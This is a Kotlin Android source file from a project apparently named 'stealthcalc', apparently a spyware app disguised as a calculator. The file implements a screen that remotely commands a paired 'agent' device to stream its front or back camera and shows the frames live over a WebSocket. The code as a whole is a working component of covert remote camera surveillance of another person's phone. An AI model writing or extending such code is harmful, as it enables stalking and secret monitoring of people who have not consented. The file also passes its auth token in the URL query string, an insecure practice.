package com.stealthcalc.monitoring.ui

import android.graphics.BitmapFactory
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.CameraFront
import androidx.compose.material.icons.filled.CameraRear
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.ImageBitmap
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import io.ktor.client.HttpClient
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.websocket.WebSockets
import io.ktor.client.plugins.websocket.webSocket
import io.ktor.websocket.Frame
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

data class LiveCameraState(
    val isConnected: Boolean = false,
    val currentFrame: ImageBitmap? = null,
    val error: String? = null,
    val currentSide: String = "front",
)

@HiltViewModel
class LiveCameraViewModel @Inject constructor(
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {

    private val _state = MutableStateFlow(LiveCameraState())
    val state: StateFlow<LiveCameraState> = _state.asStateFlow()
    private var streamJob: Job? = null

    fun startWatching(side: String) {
        streamJob?.cancel()
        _state.value = LiveCameraState(currentSide = side)

        apiClient.let {
            viewModelScope.launch {
                it.sendCommand(repository.deviceId, "stream_camera_$side")
            }
        }

        val baseUrl = repository.serverUrl.trimEnd('/')
        if (baseUrl.isBlank() || !repository.isPaired) {
            _state.value = LiveCameraState(error = "Not paired", currentSide = side)
            return
        }
        val wsUrl = baseUrl.replace("http://", "ws://").replace("https://", "wss://")
        val client = HttpClient(OkHttp) { install(WebSockets) }

        streamJob = viewModelScope.launch {
            runCatching {
                client.webSocket("$wsUrl/camera/watch/$side/${repository.deviceId}?token=${repository.authToken}") {
                    _state.value = LiveCameraState(isConnected = true, currentSide = side)
                    for (frame in incoming) {
                        if (!isActive) break
                        if (frame is Frame.Binary) {
                            val bitmap = BitmapFactory.decodeByteArray(frame.data, 0, frame.data.size)
                            if (bitmap != null) {
                                _state.value = LiveCameraState(
                                    isConnected = true,
                                    currentFrame = bitmap.asImageBitmap(),
                                    currentSide = side,
                                )
                            }
                        }
                    }
                }
            }.onFailure { e ->
                _state.value = LiveCameraState(error = "Camera stream error: ${e.message}", currentSide = side)
            }
            _state.value = _state.value.copy(isConnected = false)
            client.close()
        }
    }

    fun switchCamera() {
        val newSide = if (_state.value.currentSide == "front") "back" else "front"
        viewModelScope.launch {
            apiClient.sendCommand(repository.deviceId, "stop_camera_stream")
        }
        startWatching(newSide)
    }

    fun stopWatching() {
        streamJob?.cancel()
        viewModelScope.launch {
            apiClient.sendCommand(repository.deviceId, "stop_camera_stream")
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun LiveCameraScreen(
    onBack: () -> Unit,
    viewModel: LiveCameraViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()

    DisposableEffect(Unit) {
        viewModel.startWatching("front")
        onDispose { viewModel.stopWatching() }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text(if (state.isConnected) "Live Camera (${state.currentSide})" else "Connecting...")
                },
                navigationIcon = {
                    IconButton(onClick = { viewModel.stopWatching(); onBack() }) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .background(MaterialTheme.colorScheme.background),
            contentAlignment = Alignment.Center,
        ) {
            state.currentFrame?.let { frame ->
                Image(
                    bitmap = frame,
                    contentDescription = "Live camera",
                    modifier = Modifier.fillMaxSize(),
                    contentScale = ContentScale.Fit,
                )
            } ?: run {
                if (state.error != null) {
                    Text(state.error!!, color = MaterialTheme.colorScheme.error)
                } else {
                    CircularProgressIndicator()
                }
            }

            Row(
                modifier = Modifier
                    .align(Alignment.BottomCenter)
                    .fillMaxWidth()
                    .padding(16.dp),
                horizontalArrangement = Arrangement.Center,
            ) {
                OutlinedButton(onClick = { viewModel.switchCamera() }) {
                    Icon(
                        if (state.currentSide == "front") Icons.Default.CameraRear else Icons.Default.CameraFront,
                        contentDescription = "Switch camera"
                    )
                    Text(" Switch to ${if (state.currentSide == "front") "Back" else "Front"}")
                }
            }
        }
    }
}
